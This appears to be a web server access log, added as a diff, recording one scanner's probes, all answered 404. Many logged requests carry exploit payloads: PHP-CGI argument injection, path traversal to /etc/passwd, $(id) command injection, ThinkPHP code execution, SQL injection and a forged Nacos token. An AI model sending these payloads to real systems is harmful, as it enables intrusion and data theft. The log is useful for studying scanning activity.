+INFO:     9.135.100.135:40296 - "GET /users%3B. HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:40298 - "POST /test.php?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:40330 - "POST /test.hello?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:40466 - "POST /api/v0/train HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:40530 - "GET /login?next=/ HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:40534 - "POST /dataSetParam/verification%3Bswagger-ui/ HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:40714 - "POST / HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:40768 - "POST / HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:40762 - "GET / HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:40780 - "GET /%40fs/C%3A/windows/win.ini?import&?inline=1.wasm?init HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:40798 - "GET /%40fs/etc/passwd?import&?inline=1.wasm?init HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:40818 - "GET /%40fs/../../../../../../../etc/passwd?import&?inline=1.wasm?init HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:40844 - "GET /%40fs/%252e%252e/%252e%252e/%252e%252e/etc/passwd?import&?inline=1.wasm?init HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:40972 - "GET /index.php?p=admin/actions/assets/generate-transform HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:41012 - "GET /portalapi/v1/roles/option%3B/v1/ping HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:41014 - "POST /api/v1/validate/code HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:41064 - "GET /public/template.cgi?templatefile=$(id) HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:41232 - "GET /locales/locale.json?locale=..%2F..%2Fconfig&namespace=app HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:41234 - "POST /api/jmeter/download/files HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:41296 - "GET /camunda/app/welcome/default/ HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:41416 - "GET /?query=SHOW%20DATABASES HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:41468 - "POST /api/snapshots HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:41480 - "GET /query?db=db&q=SHOW%20DATABASES HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:41550 - "POST /api/snapshots HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:41648 - "GET /apisix/admin/migrate/export HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:41698 - "GET /version HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:41708 - "GET /druid/submitLogin HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:41762 - "GET /install.php?profile=default HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:41786 - "GET /core/install.php HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:41890 - "GET /api/dev/metrics/relation HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:41946 - "GET / HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:41966 - "POST /index.php?r=site/user-login HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:41970 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:42024 - "POST /hub/login?next HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:42054 - "POST /hub/login?next HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:42120 - "GET /./../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:42186 - "GET /nacos/v1/auth/users?pageNo=1&pageSize=10&accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:42198 - "GET /sse?transportType=stdio&command=echo&args=IT_RiskScan HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:42208 - "GET /v1/auth/users?pageNo=1&pageSize=10&accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:42288 - "GET /api/version HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:42310 - "GET / HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:42356 - "POST /login/userverify.cgi HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:42422 - "GET / HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:42454 - "GET /naming/v1/services?limit=10&offset=0 HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:42552 - "GET /web/admin/setup HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:42616 - "GET /login/ HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:42644 - "GET /index.php?s=/index/index/name/$%7B@phpinfo()%7D HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:42692 - "POST /?s=index/index/index HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:42806 - "GET /?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:42856 - "POST /index.php?s=captcha HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:42898 - "GET /index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1 HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:42942 - "GET /api/cluster/global HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:43052 - "GET /setup HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:43086 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:43114 - "GET /api/v1/namespaces/default/workflows?query HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:43138 - "GET / HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:43208 - "GET /wp-admin/install.php?step=1 HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:46086 - "PRI %2A HTTP/2.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     9.135.100.135:47696 - "GET /icons/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
